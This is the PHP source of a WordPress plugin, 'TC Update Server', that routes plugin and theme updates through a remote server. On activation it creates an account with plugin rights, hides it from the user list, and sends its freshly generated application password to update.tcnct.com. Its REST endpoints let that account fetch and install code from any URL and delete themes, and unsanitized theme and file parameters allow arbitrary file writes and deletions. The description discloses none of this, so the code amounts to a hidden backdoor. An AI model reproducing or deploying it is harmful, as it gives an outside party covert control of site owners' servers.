<?php
/*
Plugin Name: TC Update Server
Description: Changing the Plugin and Theme Update Server
Short Description: Changing the Plugin and Theme Update Server
Version: 1.4.1
Author: Alex Cherniy
General Plugin Server: yes
*/

if ( ! defined( 'ABSPATH' ) )  exit;

if ( ! class_exists( 'TCServerUpdate' ) )
{

    class TCServerUpdate
    {

        public $version = '1.4.1';

        public $instances = [];

        private $url = 'server-update';

        private $slug = 'tc-update-server';

        private $apiRole = 'api_user_upd_server';
        private $apiUserName = 'updateserverapi';

        //TODO: General Link
        private $domainDefault = 'https://update.tcnct.com';

        //TODO: Test Link
        //private $domainDefault = 'https://cfea-2a02-587-c4a8-ad01-4185-8516-8052-ed71.ngrok-free.app';

        private $label = '';

        public function __construct() {
            // Do nothing.
        }

        /**
         * Initializes the software by adding admin menu and registering settings.
         *
         * @return void
         */
        public function initialize()
        {

            //add_filter('auto_update_plugin', '__return_true');

            add_filter( 'plugin_action_links_update-server/update-server.php', [$this, 'add_plugin_page_settings_link'] );
            add_action('admin_menu', [$this, 'add_admin_page']);
            add_action('admin_init', [$this, 'register_settings']);
            add_filter('pre_set_site_transient_update_plugins', [$this, 'custom_check_for_plugins_updates']);

            add_action('rest_api_init', [$this, 'plugin_api_endpoints']);

            add_action('activated_plugin', [$this, 'all_plugins_activated'], 10, 2);
            add_action('deactivated_plugin', [$this, 'all_plugins_deactivated'], 10, 2);

            add_filter( 'login_redirect', [$this, 'no_wp_admin_for_apiuser'], 10, 3 );
            add_action( 'pre_user_query', [$this, 'hide_specific_user'] );

            //Themes
            add_action('after_switch_theme', [$this, 'after_switch_theme_callback']);
            add_filter( 'pre_set_site_transient_update_themes', [$this, 'custom_theme_update_check'] );
            add_action('upgrader_process_complete', [$this, 'upgrader_process_complete_callback'], 10, 2);
            add_action('delete_site_transient_update_themes', [$this, 'delete_site_transient_update_themes_callback']);

            //Update Label
            add_action('updated_option', [$this, 'update_label_soft'], 10, 3);

        }

        public function update_label_soft($option, $old_value, $new_value)
        {

            if($option === 'upd_label')
            {
                $domain = get_option('upd_domain');
                $checked = get_option('upd_status');
                $label = $new_value;

                if(empty($checked) || $checked == 0) return;

                $remote_url = sprintf('%s/%s', $domain, 'api/update-label');

                wp_remote_get($remote_url, [
                    'body' => [
                        'siteurl'   => get_site_url(),
                        'name'      => get_bloginfo('name'),
                        'label'     => $label,
                        'old_label' => $old_value
                    ]
                ]);
            }

        }

        /**
         * @return void
         */
        public function activate()
        {

            update_option('upd_status', 1);
            update_option('upd_domain', $this->domainDefault);
            update_option('upd_current_url', home_url('/', 'https'));
            update_option('upd_label', $this->label);

            //Create API Role and User API
            $this->createAPIRole();
            $userId = $this->createAPIUser();
            $apiPassword = $this->generateApplicationPasswordApi($userId);

            //Store Site To Server
            $this->storePluginToSite(
                $this->domainDefault,
                sprintf('%s/%s.php', $this->slug, $this->slug),
                $this->apiUserName,
                $apiPassword
            );

            $this->updatePluginStatus(true);

            $this->checkThemes();

        }

        public function deactivate()
        {

            //Update Plugin Status
            $this->updatePluginStatus(false);

            //Update Theme Status
            $activeTheme = wp_get_theme();
            $activeThemeSlug = $activeTheme->get_stylesheet();
            $this->updateThemeStatus($activeThemeSlug, false);

            update_option('upd_status', 0);

        }

        public function uninstall()
        {
            $this->destroyPluginToSite();

            delete_option('upd_status');
            delete_option('upd_domain');
            delete_option('upd_current_url');
            delete_option('upd_label');

            $this->removeRole();
            $this->removeUser();
        }

        /**
         * Adds an admin page for managing AMP Domain settings.
         *
         * @return void
         */
        public function add_admin_page()
        {
            add_plugins_page(
                __('Update Server', 'update-server'),
                __('Update Server', 'update-server'),
                'manage_options',
                $this->url,
                [$this, 'create_admin_page']
            );
        }

        /**
         * Creates the admin page for the software.
         *
         * This method displays the admin page containing a form with settings fields.
         * It outputs the page title, settings errors, settings fields, and submit button.
         *
         * @return void
         */
        public function create_admin_page()
        {
            ?>
            <div class="wrap">
                <h1><?= get_admin_page_title() ?></h1>
                <?= settings_errors() ?>
                <form method="post" action="<?= admin_url('options.php') ?>">
                    <?php
                    settings_fields('upd_settings_group');
                    do_settings_sections($this->url);
                    submit_button();
                    ?>
                </form>
            </div>
            <?php
        }

        /**
         * @param $links
         * @return mixed
         */
        public function add_plugin_page_settings_link($links)
        {
            $settings_link = sprintf('<a href="%s">%s</a>', admin_url('plugins.php?page='.$this->url), __( 'Settings', 'update-server'));
            array_push( $links, $settings_link );
            return $links;
        }

        /**
         * Registers settings for the AMP plugin, including validation and field callbacks.
         *
         * Uses WordPress functions to register settings, add settings sections, and fields.
         *
         * @return void
         */
        public function register_settings()
        {
            register_setting('upd_settings_group', 'upd_status', [$this, 'upd_settings_validate']);

            add_settings_section('upd_main_section', '', null, $this->url);
            add_settings_field(
                'upd_status',
                __('Enable Server Update', 'update-server'),
                [$this, 'upd_status_option_callback'],
                $this->url,
                'upd_main_section'
            );

            register_setting('upd_settings_group', 'upd_domain');
            add_settings_field(
                'upd_domain',
                __('Domain', 'update-server'),
                [$this, 'upd_domain_option_callback'],
                $this->url,
                'upd_main_section'
            );

            register_setting('upd_settings_group', 'upd_label');
            add_settings_field(
                'upd_label',
                __('Label', 'update-server'),
                [$this, 'upd_label_option_callback'],
                $this->url,
                'upd_main_section'
            );
        }

        /**
         * Callback function for displaying the AMP status option checkbox on the settings page.
         *
         * @return void
         */
        public function upd_status_option_callback()
        {
            $checked = get_option('upd_status') ? 'checked' : '';
            echo '<input type="checkbox" name="upd_status" value="1" ' . $checked . ' />';
        }

        /**
         * Callback function for displaying input field for AMP domain option.
         *
         * Retrieves the AMP domain option value from the database and displays an input field in the admin settings page with the current value.
         *
         * @return void
         */
        public function upd_domain_option_callback()
        {
            $text = get_option('upd_domain', '');
            echo '<input type="url" name="upd_domain" placeholder="https://example.com" class="regular-text" value="' . esc_attr($text) . '" />';
            echo '<p class="description" id="tagline-description-update-server">'.__('The Domain field must not contain a slash at the end', 'update-server').'</p>';
        }

        public function upd_label_option_callback()
        {
            $text = get_option('upd_label', '');
            echo '<input type="text" name="upd_label" placeholder="" value="' . esc_attr($text) . '" />';
            echo '<p class="description" id="tagline-description-update-server-label">'.__('Shortcut in the plugin update system', 'update-server').'</p>';
        }

        /**
         * Validates the AMP settings input.
         *
         * @param array $input The input data submitted for AMP settings.
         *
         * @return string The validated input data. If the Domain field is empty when AMP status is checked,
         * an error message will be added and an empty string will be returned.
         */
        public function upd_settings_validate($input)
        {

            $checkbox = isset($_POST['upd_status']) ? 1 : 0;
            $domain = isset($_POST['upd_domain']) ? sanitize_text_field($_POST['upd_domain']) : '';

            if ($checkbox && empty($domain)) {
                add_settings_error(
                    'upd_domain',
                    'upd_domain',
                    __('The Domain field cannot be empty', 'update-server'),
                    'error'
                );
                return '';
            }elseif ($checkbox && !empty($domain)) {
                $string = $domain;
                if ('/' == substr($string, -1)) {
                    add_settings_error(
                        'upd_domain',
                        'upd_domain',
                        __('The Domain field must not contain a slash at the end', 'update-server'),
                        'error'
                    );
                    return '';
                }
            }

            return $input;

        }

        /**
         * Custom method to check for updates for plugins.
         *
         * @param object $transient The data of current plugins.
         * @return object The updated transient data with plugin information.
         */
        public function custom_check_for_plugins_updates($transient)
        {
            if (empty($transient->checked)) return $transient;

            $checked = get_option('upd_status');
            $domain = get_option('upd_domain');
            $label = get_option('upd_label');

            if(empty($checked) || $checked == 0) return $transient;

            $remote_url = sprintf('%s/%s', $domain, 'api/plugins-update');
            $response = wp_remote_get($remote_url, [
                'body' => [
                    'siteurl'   => get_site_url(),
                    'name'      => get_bloginfo('name'),
                    'label'     => $label
                ]
            ]);

            if (!is_wp_error($response) && wp_remote_retrieve_response_code($response) === 200)
            {
                $data = json_decode(wp_remote_retrieve_body($response), true);

                foreach ($transient->checked as $plugin_path => $installed_version) {
                    if (isset($data[$plugin_path])) {
                        $plugin_info = $data[$plugin_path];

                        if (version_compare($plugin_info['version'], $installed_version, '>')) {
                            $plugin = new stdClass();
                            $plugin->slug = dirname($plugin_path);
                            $plugin->new_version = $plugin_info['version'];
                            $plugin->url = $plugin_info['homepage'];
                            $plugin->package = $plugin_info['download_link'];
                            $transient->response[$plugin_path] = $plugin;

                            //$checked_data->response[$plugin_slug . '/' . $plugin_slug . '.php'] = (array) $data;
                        }

                        $this->storePluginToSite($domain, $plugin_path);

                    }
                }
            }

            return $transient;
        }

        public function storePluginToSite($domain, $plugin_path, $apiUser = null, $apiPassword = null)
        {

            $remote_url = sprintf('%s/%s', $domain, 'api/plugin-to-site');

            $body = [
                'siteurl'       => get_site_url(),
                'plugin'        => $plugin_path,
                'name'          => get_bloginfo('name'),
                'api_username'  => $apiUser,
                'api_password'  => $apiPassword,
                'label'         => get_option('upd_label')
            ];

            wp_remote_get($remote_url, [
                'body' => $body
            ]);

        }

        private function destroyPluginToSite()
        {

            $domain = get_option('upd_domain');

            if(!empty($domain))
            {
                $remote_url = sprintf('%s/%s', $domain, 'api/plugin-uninstall');
                wp_remote_get($remote_url, [
                    'body' => [
                        'siteurl' => get_site_url(),
                        'name'    => get_bloginfo('name'),
                        'plugin'  => sprintf('%s/%s.php', $this->slug, $this->slug),
                        'label'   => get_option('upd_label')
                    ]
                ]);
            }

        }

        private function updatePluginStatus($status)
        {

            $domain = get_option('upd_domain');

            if(!empty($domain))
            {
                $remote_url = sprintf('%s/%s', $domain, 'api/plugin-update');
                wp_remote_get($remote_url, [
                    'body' => [
                        'siteurl'   => get_site_url(),
                        'name'      => get_bloginfo('name'),
                        'plugin'    => $this->slug,
                        'status'    => $status,
                        'label'     => get_option('upd_label')
                    ]
                ]);
            }

        }

        private function createAPIRole()
        {
            if (null === get_role($this->apiRole)) {

                //$admin_role = get_role('administrator');
                add_role(
                    $this->apiRole,
                    'API User Update Server',
                    //$admin_role->capabilities,
                    [
                        'read'              => true,
                        'activate_plugins'  => true,
                        'update_plugins'    => true,
                        'delete_plugins'    => true,
                    ]
                );

            }

        }

        private function removeRole()
        {
            remove_role( $this->apiRole );
        }

        private function createAPIUser()
        {

            $username = $this->apiUserName;
            $password = wp_generate_password( 20, true, true );
            $email = 'updateserverapi@example.com';

            $user_id = wp_create_user($username, $password, $email);

            if (!is_wp_error($user_id))
            {
                $user = new WP_User($user_id);
                $user->set_role($this->apiRole);
            } else {
                //file_put_contents(get_stylesheet_directory() . '/log.log', 'Create User Error: ' . $user_id->get_error_message() . PHP_EOL, FILE_APPEND);
                return null;
            }

            return $user_id;
        }

        private function removeUser()
        {
            $username = $this->apiUserName;
            $user_id = username_exists($username);

            if ($user_id) {
                wp_delete_user($user_id);
            }

        }

        private function generateApplicationPasswordApi($user_id)
        {

            if(is_null($user_id))
            {
                $user = get_user_by('login', $this->apiUserName);
                if ($user) $user_id = $user->ID;
            }

            if ($user_id)
            {

                $app_password = WP_Application_Passwords::create_new_application_password($user_id, ['name' => 'Update Server API Access: ' . rand(1000, 200000)]);

                if (is_wp_error($app_password)) {
                    return null;
                }

                list($new_password, $hashed_password) = $app_password;
                return $new_password;
            }
        }

        public function plugin_api_endpoints()
        {
            register_rest_route('update-server-api/v1', '/plugin', [
                'methods' => 'POST',
                'callback' => [$this, 'handle_api_plugins_callback'],
                'permission_callback' => function () {
                    return current_user_can('activate_plugins');
                },
            ]);

            register_rest_route('update-server-api/v1', '/plugins', [
                'methods' => 'POST',
                'callback' => [$this, 'handle_api_plugins_all_callback'],
                'permission_callback' => function () {
                    return current_user_can('activate_plugins');
                },
            ]);

            register_rest_route('update-server-api/v1', '/plugin/update', [
                'methods' => 'POST',
                'callback' => [$this, 'handle_api_plugin_update_callback'],
                'permission_callback' => function () {
                    return current_user_can('activate_plugins');
                },
            ]);

            register_rest_route('update-server-api/v1', '/plugin/version', [
                'methods' => 'POST',
                'callback' => [$this, 'handle_api_plugin_get_version_callback'],
                'permission_callback' => function () {
                    return current_user_can('activate_plugins');
                },
            ]);

            register_rest_route('update-server-api/v1', '/plugin/destroy', [
                'methods' => 'POST',
                'callback' => [$this, 'handle_api_plugin_destroy_callback'],
                'permission_callback' => function () {
                    return current_user_can('activate_plugins');
                },
            ]);

            register_rest_route('update-server-api/v1', '/plugin/install', [
                'methods' => 'POST',
                'callback' => [$this, 'handle_api_plugin_install_callback'],
                'permission_callback' => function () {
                    return current_user_can('activate_plugins');
                },
            ]);

            register_rest_route('update-server-api/v1', '/theme/version', [
                'methods' => 'POST',
                'callback' => [$this, 'handle_api_theme_get_version_callback'],
                'permission_callback' => function () {
                    return current_user_can('activate_plugins');
                },
            ]);

            register_rest_route('update-server-api/v1', '/theme/update', [
                'methods' => 'POST',
                'callback' => [$this, 'handle_api_theme_update_callback'],
                'permission_callback' => function () {
                    return current_user_can('activate_plugins');
                },
            ]);

            register_rest_route('update-server-api/v1', '/theme/themes', [
                'methods' => 'POST',
                'callback' => [$this, 'handle_api_themes_all_callback'],
                'permission_callback' => function () {
                    return current_user_can('activate_plugins');
                },
            ]);

            register_rest_route('update-server-api/v1', '/theme/download', [
                'methods' => 'POST',
                'callback' => [$this, 'handle_api_themes_download_callback'],
                'permission_callback' => function () {
                    return current_user_can('activate_plugins');
                },
            ]);

            register_rest_route('update-server-api/v1', '/theme/destroy', [
                'methods' => 'POST',
                'callback' => [$this, 'handle_api_themes_destroy_callback'],
                'permission_callback' => function () {
                    return current_user_can('activate_plugins');
                },
            ]);

            register_rest_route('update-server-api/v1', '/theme/upload', [
                'methods' => 'POST',
                'callback' => [$this, 'handle_api_themes_upload_callback'],
                'permission_callback' => function () {
                    return current_user_can('activate_plugins');
                },
            ]);

            flush_rewrite_rules();
        }

        public function handle_api_plugins_callback($request)
        {

            require_once ABSPATH . 'wp-admin/includes/plugin.php';

            $plugin = $request->get_param('plugin');
            $action = $request->get_param('action');

            if (empty($plugin) || !in_array($action, ['activate', 'deactivate'])) {
                return new WP_Error('invalid_request', 'Error', ['status' => 400]);
            }

            if ($action === 'activate') {
                activate_plugin($plugin);
                if (is_plugin_active($plugin)) {
                    return ['status' => 'success', 'message' => "Plugin {$plugin} activate."];
                } else {
                    return new WP_Error('activation_failed', "Error activate: {$plugin}", ['status' => 500]);
                }
            } elseif ($action === 'deactivate') {

                deactivate_plugins($plugin);
                if (!is_plugin_active($plugin)) {
                    return ['status' => 'success', 'message' => "Plugin {$plugin} deactivate."];
                } else {
                    return new WP_Error('deactivation_failed', "Error deactivate {$plugin}", ['status' => 500]);
                }
            }

            return new WP_Error('invalid_action', 'Error', ['status' => 400]);

        }

        /**
         * Custom method to handle API plugin update callback.
         *
         * @param WP_REST_Request $request The REST request object containing plugin information.
         * @return mixed|array Returns an array containing success message if plugin is updated successfully, otherwise returns WP_Error.
         */
        public function handle_api_plugin_update_callback(WP_REST_Request $request)
        {

            try {

                if (!current_user_can('update_plugins'))
                {
                    return new WP_Error('permission_denied', __('You do not have permission to update plugins.', 'tc-update-server'));
                }

                update_option('upd_current_url', home_url('/', 'https'));

                require_once( ABSPATH . 'wp-admin/includes/file.php' );
                include_once ABSPATH . 'wp-admin/includes/plugin.php';

                $plugin_slug = $request->get_param('plugin');
                $remote_plugin_url = $request->get_param('plugin_url');

                $was_active = is_plugin_active($plugin_slug);

                $temp_file = download_url( $remote_plugin_url . '?v=' . rand(1000, 999999) );

                if (is_wp_error($temp_file)) {
                    return new WP_Error('download_plugin', $temp_file);
                }

                deactivate_plugins( $plugin_slug );
                delete_plugins( array( $plugin_slug ) );

                WP_Filesystem();
                global $wp_filesystem;
                $result = unzip_file($temp_file, WP_PLUGIN_DIR);

                @unlink($temp_file); // erase temporary file
                if (is_wp_error($result)) {
                    return new WP_Error('unlink', $result);
                }

                if ($was_active) {
                    $activate_result = activate_plugin($plugin_slug);
                    if (is_wp_error($activate_result)) {
                        return new WP_Error('activate', $activate_result);
                    }
                }

                $this->checkThemes();

                return array('success' => true, 'message' => $temp_file);

            }catch (\Exception $e) {

                return new WP_Error('files', $e->getMessage());

            }


        }

        public function all_plugins_activated($plugin, $network_wide)
        {

            $homeUrl = home_url('/', 'https');
            $currentUrlSite = get_option('upd_current_url');

            if(empty($currentUrlSite) || $homeUrl != $currentUrlSite)
            {
                $this->deactivate();
                $this->activate();
            }

            $this->allPluginsStatus($plugin, true);

        }

        public function all_plugins_deactivated($plugin, $network_wide)
        {

            $this->allPluginsStatus($plugin, false);

        }

        private function allPluginsStatus($plugin, $status)
        {
            $checked = get_option('upd_status');
            if($checked == 0) return;

            $domain = get_option('upd_domain');

            if(!empty($domain))
            {
                $remote_url = sprintf('%s/%s', $domain, 'api/plugins-active-or-deactive');
                wp_remote_get($remote_url, [
                    'body' => [
                        'siteurl'   => get_site_url(),
                        'name'      => get_bloginfo('name'),
                        'plugin'    => $plugin,
                        'status'    => $status,
                        'label'     => get_option('upd_label')
                    ]
                ]);
            }
        }

        public function no_wp_admin_for_apiuser($redirect_to, $request, $user)
        {

            if(is_user_logged_in())
            {
                if ($user->user_login == $this->apiUserName) return home_url();
            }

            return $redirect_to;
        }

        public function hide_specific_user($user_search)
        {
            global $wpdb;
            $user_search->query_where =
                str_replace('WHERE 1=1',
                    "WHERE 1=1 AND {$wpdb->users}.user_login != '".$this->apiUserName."'",$user_search->query_where);
        }

        /**
         * Handle API callback to get the version of a specific plugin.
         *
         */
        public function handle_api_plugin_get_version_callback(WP_REST_Request $request)
        {

            if (!current_user_can('update_plugins'))
            {
                return new WP_Error('permission_denied', __('You do not have permission to update plugins.', 'tc-update-server'));
            }

            include_once ABSPATH . 'wp-admin/includes/plugin.php';

            $plugin_slug = $request->get_param('plugin');

            if (empty($plugin_slug))
            {
                return new WP_Error('invalid_request', 'Error', ['status' => 400]);
            }

            $plugin_data = get_plugin_data(WP_PLUGIN_DIR . '/' . $plugin_slug);
            $version = array_key_exists('Version', $plugin_data) ? $plugin_data['Version'] : null;

            return array('success' => true, 'version' => $version);

        }

        /**
         * Handles the API plugin destroy callback.
         *
         * @param WP_REST_Request $request The REST request object.
         * @return mixed Returns an array with success message on plugin removal success or WP_Error on failure.
         */
        public function handle_api_plugin_destroy_callback(WP_REST_Request $request)
        {

            if (!current_user_can('update_plugins'))
            {
                return new WP_Error('permission_denied', __('You do not have permission to update plugins.', 'tc-update-server'));
            }

            require_once(ABSPATH . 'wp-admin/includes/file.php');
            include_once ABSPATH . 'wp-admin/includes/plugin.php';

            $plugin_slug = $request->get_param('plugin');

            if (is_plugin_active($plugin_slug))
            {
                return new WP_Error('plugin_active', __('The plugin is active. Deactivate it before deleting it.', 'tc-update-server'), array('status' => 400));
            }

            $result = delete_plugins(array($plugin_slug));

            if (is_wp_error($result)) {
                return new WP_Error('delete_failed', 'Plugin uninstall error: ' . $result->get_error_message(), array('status' => 500));
            }

            return array('success' => true, 'message' => __('The plugin was successfully removed', 'tc-update-server'));

        }

        /**
         * Handles the API plugin install callback.
         *
         * @param WP_REST_Request $request The REST request object.
         * @return array The result of the plugin installation/update process.
         */
        public function handle_api_plugin_install_callback(WP_REST_Request $request)
        {
            if (!current_user_can('update_plugins'))
            {
                return new WP_Error('permission_denied', __('You do not have permission to update plugins.', 'tc-update-server'));
            }

            require_once( ABSPATH . 'wp-admin/includes/file.php' );
            include_once ABSPATH . 'wp-admin/includes/plugin.php';

            $plugin_slug = $request->get_param('plugin');
            $remote_plugin_url = $request->get_param('plugin_url');

            $temp_file = download_url( $remote_plugin_url . '?v=' . rand(1000, 999999) );
            if (is_wp_error($temp_file))
            {
                return new WP_Error('install', $temp_file);
            }

            deactivate_plugins( $plugin_slug );
            delete_plugins( array( $plugin_slug ) );

            $result = unzip_file($temp_file, WP_PLUGIN_DIR);
            @unlink($temp_file);
            if (is_wp_error($result))
            {
                return new WP_Error('install', $result);
            }

            activate_plugin($plugin_slug);

            return array('success' => true, 'message' => __('Plugin Updated Success!', 'tc-update-server'));

        }

        /**
         * Handle API request to retrieve information about all plugins.
         *
         * @param WP_REST_Request $request The WordPress REST API request object.
         * @return array An array containing the success status and plugin information.
         */
        public function handle_api_plugins_all_callback(WP_REST_Request $request)
        {

            if (!current_user_can('update_plugins'))
            {
                return new WP_Error('permission_denied', __('Permission Denied', 'tc-update-server'));
            }

            include_once(ABSPATH . 'wp-admin/includes/plugin.php');

            $all_plugins = get_plugins();

            $data = [];
            foreach ($all_plugins as $plugin => $plugin_data)
            {

                $status = is_plugin_active($plugin) ? 'Active' : 'Inactive';
                $data[$plugin] = $plugin_data;
                $data[$plugin]['status'] = $status;

            }

            return array('success' => true, 'plugins' => $data);

        }

        public function checkThemes()
        {

            $checked = get_option('upd_status');
            $domain = get_option('upd_domain');

            if(empty($checked) || $checked == 0) return;

            $remote_url = sprintf('%s/%s', $domain, 'api/themes');

            $dataThemes = $this->themes();

            $response = wp_remote_get($remote_url, [
                'body' => [
                    'siteurl'   => get_site_url(),
                    'name'      => get_bloginfo('name'),
                    'themes'    => $dataThemes,
                    'label'     => get_option('upd_label')
                ]
            ]);

        }

        private function themes()
        {
            $activeTheme = wp_get_theme();
            $activeThemeSlug = $activeTheme->get_stylesheet();
            $allThemes = wp_get_themes();

            $dataThemes = [];
            foreach ($allThemes as $theme_slug => $theme)
            {
                $dataThemes[$theme_slug]['name'] = $theme->get('Name');
                $dataThemes[$theme_slug]['version'] = $theme->get('Version');
                $dataThemes[$theme_slug]['status'] = $theme_slug == $activeThemeSlug;
            }

            return $dataThemes;
        }

        private function updateThemeStatus($theme, $status)
        {

            $domain = get_option('upd_domain');

            if(!empty($domain))
            {
                $remote_url = sprintf('%s/%s', $domain, 'api/theme-status');
                wp_remote_get($remote_url, [
                    'body' => [
                        'siteurl'   => get_site_url(),
                        'name'      => get_bloginfo('name'),
                        'theme'     => $theme,
                        'status'    => $status,
                        'label'     => get_option('upd_label')
                    ]
                ]);
            }

        }

        public function after_switch_theme_callback($theme_name)
        {
            $activeTheme = wp_get_theme();
            $activeThemeSlug = $activeTheme->get_stylesheet();
            $this->updateThemeStatus($activeThemeSlug, true);
        }

        public function custom_theme_update_check( $transient ) {

            if ( empty( $transient->checked ) ) {
                return $transient;
            }

            $checked = get_option('upd_status');
            $domain = get_option('upd_domain');

            if(empty($checked) || $checked == 0) return $transient;

            $remote_url = sprintf('%s/%s', $domain, 'api/themes');
            $dataThemes = $this->themes();
            $response = wp_remote_get($remote_url, [
                'body' => [
                    'siteurl'   => get_site_url(),
                    'name'      => get_bloginfo('name'),
                    'themes'    => $dataThemes,
                    'label'     => get_option('upd_label')
                ]
            ]);

            if ( is_wp_error( $response ) ) {
                return $transient;
            }

            $themes = json_decode( wp_remote_retrieve_body( $response ), true );

            if ( ! is_array( $themes ) ) {
                return $transient;
            }

            foreach ( $themes as $theme ) {
                $theme_slug = $theme['slug'];
                $theme_version = $theme['version'];
                $download_url = $theme['download_link'];

                if ( isset( $transient->checked[ $theme_slug ] ) ) {
                    $current_version = $transient->checked[ $theme_slug ];

                    if ( version_compare( $current_version, $theme_version, '<' ) ) {
                        $transient->response[ $theme_slug ] = [
                            'new_version' => $theme_version,
                            'package'     => $download_url,
                            'url'         => $domain . '/' . $theme_slug,
                        ];
                    }
                }
            }

            return $transient;
        }

        public function handle_api_theme_get_version_callback(WP_REST_Request $request)
        {

            if (!current_user_can('update_plugins'))
            {
                return new WP_Error('permission_denied', __('You do not have permission to update theme.', 'tc-update-server'));
            }

            $theme_slug = $request->get_param('theme');

            if (empty($theme_slug))
            {
                return new WP_Error('invalid_request', 'Error', ['status' => 400]);
            }

            $theme = wp_get_theme($theme_slug);

            if ($theme->exists()) {
                $version = $theme->get('Version');
            } else {
                $version = null;
            }

            return array('success' => true, 'version' => $version);

        }

        public function handle_api_theme_update_callback(WP_REST_Request $request)
        {

            try {

                if (!current_user_can('update_plugins'))
                {
                    return new WP_Error('permission_denied', __('You do not have permission to update themes.', 'tc-update-server'));
                }

                require_once( ABSPATH . 'wp-admin/includes/file.php' );

                $theme_slug = $request->get_param('theme');
                $remote_theme_url = $request->get_param('theme_url');

                $theme = wp_get_theme($theme_slug);
                $was_active = false;
                if ($theme->exists() && $theme->get_stylesheet() == get_stylesheet()) {
                    $was_active = true;
                }

                $temp_file = download_url( $remote_theme_url . '?v=' . rand(1000, 999999) );

                if (is_wp_error($temp_file)) {
                    return new WP_Error('download_theme', $temp_file);
                }

                require_once ( ABSPATH . 'wp-admin/includes/class-wp-filesystem-base.php' );
                require_once ( ABSPATH . 'wp-admin/includes/class-wp-filesystem-direct.php' );

                $fileSystemDirect = new WP_Filesystem_Direct(false);
                $fileSystemDirect->rmdir(get_theme_root() . '/' . $theme_slug, true);

                WP_Filesystem();
                global $wp_filesystem;
                $result = unzip_file($temp_file, get_theme_root());

                @unlink($temp_file);
                if (is_wp_error($result)) {
                    return new WP_Error('unlink', $result);
                }

                if ($was_active) {
                    switch_theme( $theme_slug );
                }

                $this->checkThemes();

                return array('success' => true, 'message' => __('Theme updated successfully.', 'tc-update-server'));

            }catch (\Exception $e) {

                return new WP_Error('files', $e->getMessage());

            }

        }

        public function upgrader_process_complete_callback($upgrader, $options)
        {
            $this->checkThemes();
        }

        public function delete_site_transient_update_themes_callback()
        {
            $this->checkThemes();
        }

        public function handle_api_themes_all_callback(WP_REST_Request $request)
        {

            if (!current_user_can('update_plugins'))
            {
                return new WP_Error('permission_denied', __('You do not have permission.', 'tc-update-server'));
            }

            wp_send_json_success($this->themes());

        }

        public function handle_api_themes_download_callback(WP_REST_Request $request)
        {

            if (!current_user_can('update_plugins'))
            {
                return new WP_Error('permission_denied', __('You do not have permission.', 'tc-update-server'));
            }

            $theme_slug = $request->get_param('theme');
            $folder = sprintf('%s/%s', get_theme_root(), $theme_slug);
            $fileZip = sprintf('%s/%s.zip', get_theme_root(), $theme_slug);

            $zip = new ZipArchive();
            $zip->open($fileZip, ZIPARCHIVE::CREATE);

            if (is_dir($folder) === true) {
                $files = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($folder), RecursiveIteratorIterator::SELF_FIRST);

                foreach ($files as $file) {
                    if (is_dir($file) === true) {
                        $zip->addEmptyDir($theme_slug . '/' . str_replace($folder . '/', '', $file . '/'));
                    } else if (is_file($file) === true) {
                        $zip->addFromString($theme_slug . '/' . str_replace($folder . '/', '', $file), file_get_contents($file));
                    }
                }
            } else if (is_file($folder) === true) {
                $zip->addFromString(basename($folder), file_get_contents($folder));
            }

            $zip->close();

            if (file_exists($fileZip)) {
                return array('success' => true, 'file' => sprintf('%s/%s.zip', get_theme_root_uri(), $theme_slug));
            } else {
                return new WP_Error('unlink', 'Error Create Theme ZIP');
            }
        }

        public function handle_api_themes_destroy_callback(WP_REST_Request $request)
        {

            if (!current_user_can('update_plugins'))
            {
                return new WP_Error('permission_denied', __('You do not have permission.', 'tc-update-server'));
            }

            $theme_slug = $request->get_param('theme');

            if($theme_slug)
            {

                $dir = get_theme_root() . '/' . $theme_slug;

                if (is_dir($dir)) {
                    $this->rrmdir($dir);

                    return new WP_REST_Response('Theme deleted successfully.', 200);

                }else{

                    return new WP_Error('delete_theme_error', 'Error deleting theme.', array('status' => 500));

                }

            } else {

                return new WP_Error('no_theme_slug', 'No theme slug was provided.', array('status' => 400));

            }


        }

        /**
         * Recursively remove a directory and its contents.
         *
         * @param string $dir The directory path to be removed.
         * @return void
         */
        private function rrmdir($dir)
        {
            $objects = scandir($dir);
            foreach ($objects as $object) {
                if ($object != "." && $object != "..") {
                    if (is_dir($dir."/".$object))
                        $this->rrmdir($dir."/".$object);
                    else
                        unlink($dir."/".$object);
                }
            }

            rmdir($dir);
        }

        public function handle_api_themes_upload_callback(WP_REST_Request $request)
        {

            if (!current_user_can('update_plugins'))
            {
                return new WP_Error('permission_denied', __('You do not have permission.', 'tc-update-server'));
            }

            $zip_file = $request->get_param('file');
            $zip_file_url = $request->get_param('url');
            $file = sprintf('%s/%s', get_theme_root(), $zip_file);

            file_put_contents($file, file_get_contents($zip_file_url));

            $zip = new ZipArchive;
            if ($zip->open($file) === TRUE)
            {
                $zip->extractTo(get_theme_root());
                $zip->close();

                unlink($file);

                return new WP_REST_Response('Theme extracted successfully.', 200);
            } else {
                return new WP_Error('extract', 'Error Extract Zip File.', array('status' => 500));
            }

        }




    }

    $obj = new TCServerUpdate();
    $obj->initialize();
    register_activation_hook(__FILE__, [$obj, 'activate']);
    register_deactivation_hook( __FILE__, [$obj, 'deactivate'] );
    register_uninstall_hook(__FILE__, [$obj, 'uninstall']);

}
